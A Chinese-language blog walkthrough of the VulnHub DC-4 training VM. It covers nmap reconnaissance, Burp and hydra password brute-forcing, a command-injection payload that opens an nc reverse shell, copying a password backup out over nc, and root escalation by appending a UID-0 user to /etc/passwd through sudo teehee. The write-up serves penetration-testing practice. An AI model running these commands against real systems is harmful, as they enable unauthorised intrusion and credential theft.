---
# 这是页面的图标
icon: api
# 这是文章的标题
title: 靶机 DC4-writeup
# 设置作者
author: lhz
# 设置写作时间
time: 2021-09-26
# 一个页面只能有一个分类
category: 渗透
# 一个页面可以有多个标签
tag:
  - 渗透
  - 靶机
comment: false
typora-root-url: ..\..\..\.vuepress\public


---

## 0x01 部署

靶机地址：

><https://www.vulnhub.com/entry/dc-4,313/>

**DESCRIPTION**

DC-4 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.

Unlike the previous DC releases, this one is designed primarily for beginners/intermediates. There is only one flag, but technically, multiple entry points and just like last time, no clues.

Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.

For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won't give you the answer, instead, I'll give you an idea about how to move forward.

只有一个flag

## 0x02 信息收集

靶机使用vmware部署，NAT模式

nmap扫描网段

```
nmap -sP 192.168.190.0/24
```

![image-20210926153642099](/assets/img/image-20210926153642099.png)

发现靶机IP：192.168.190.139，继续扫描

```
nmap -T5 -A -v -p- 192.168.190.139
```

结果：

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-26 14:27 CST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 14:27
Completed NSE at 14:27, 0.00s elapsed
Initiating NSE at 14:27
Completed NSE at 14:27, 0.00s elapsed
Initiating NSE at 14:27
Completed NSE at 14:27, 0.00s elapsed
Initiating ARP Ping Scan at 14:27
Scanning 192.168.190.139 [1 port]
Completed ARP Ping Scan at 14:27, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:27
Completed Parallel DNS resolution of 1 host. at 14:27, 0.00s elapsed
Initiating SYN Stealth Scan at 14:27
Scanning 192.168.190.139 [65535 ports]
Discovered open port 80/tcp on 192.168.190.139
Discovered open port 22/tcp on 192.168.190.139
Completed SYN Stealth Scan at 14:27, 1.00s elapsed (65535 total ports)
Initiating Service scan at 14:27
Scanning 2 services on 192.168.190.139
Completed Service scan at 14:27, 6.02s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 192.168.190.139
NSE: Script scanning 192.168.190.139.
Initiating NSE at 14:27
Completed NSE at 14:27, 0.11s elapsed
Initiating NSE at 14:27
Completed NSE at 14:27, 0.00s elapsed
Initiating NSE at 14:27
Completed NSE at 14:27, 0.00s elapsed
Nmap scan report for 192.168.190.139
Host is up (0.00045s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)
|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)
|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)
80/tcp open  http    nginx 1.15.10
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.15.10
|_http-title: System Tools
MAC Address: 00:0C:29:B3:F5:3B (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Uptime guess: 198.838 days (since Thu Mar 11 18:21:01 2021)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.45 ms 192.168.190.139

NSE: Script Post-scanning.
Initiating NSE at 14:27
Completed NSE at 14:27, 0.00s elapsed
Initiating NSE at 14:27
Completed NSE at 14:27, 0.00s elapsed
Initiating NSE at 14:27
Completed NSE at 14:27, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.81 seconds
           Raw packets sent: 65558 (2.885MB) | Rcvd: 65550 (2.623MB)
```

发现80端口，登陆后只有一个登录界面，未发现其他公开的CMS或组件

![image-20210926153952656](/assets/img/image-20210926153952656.png)

## 0x03 渗透

尝试使用burpsuite进行web爆破，根据系统名包含admin，指定用户名admin，先爆破密码

![image-20210926154453036](/assets/img/image-20210926154453036.png)

爆破发现admin密码happy

使用admin登录后，发现web提供了执行命令的功能，需要执行的命令通过post参数传递

![image-20210926154602455](/assets/img/image-20210926154602455.png)

使用nc回弹shell，kali执行

```
nc -lvp 4444 
```

使用hackbar发送post参数`radio=nc 192.168.190.129 4444 -e /bin/bash&submit=Run`，获得反弹shell

![image-20210926154739554](/assets/img/image-20210926154739554.png)

执行命令获取方便观察的shell

```
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

## 0x04 提权

查看/etc/passwd，发现几个用户，去home下查看，只有jim下存在文件，backups下有一个old-passwds.bak文件，mbox文件无权限，test.sh没什么用处

使用nc获取old-passwds.bak文件

```
nc -nvlp 5555 > old-passwords.bak
nc 192.168.141.134 5555 < /home/jim/backups/old-passwords.bak
```

然后使用old-passwords.bak文件对jim进行爆破

```
hydra -l jim -P old-passwords.bak -vV 192.168.190.139 ssh
```

爆破成功得到密码：

![image-20210926160224587](/assets/img/image-20210926160224587.png)

登录jim后发现mbox下内容：

![image-20210926160501768](/assets/img/image-20210926160501768.png)

似乎是一个邮件，在/var/mail/jim中发现邮件内容：

![image-20210926160535935](/assets/img/image-20210926160535935.png)

得到charles密码

登录charles，执行`sudo -l`发现charly可以执行teehee，可以将标准输入复制到我们选择的文件中

创建一个拥有root权限的账号

```bash
echo "test::0:0:::/bin/sh" | sudo teehee -a /etc/passwd
su test
whoami
```

在/root/下找到flag

![image-20210926160832848](/assets/img/image-20210926160832848.png)



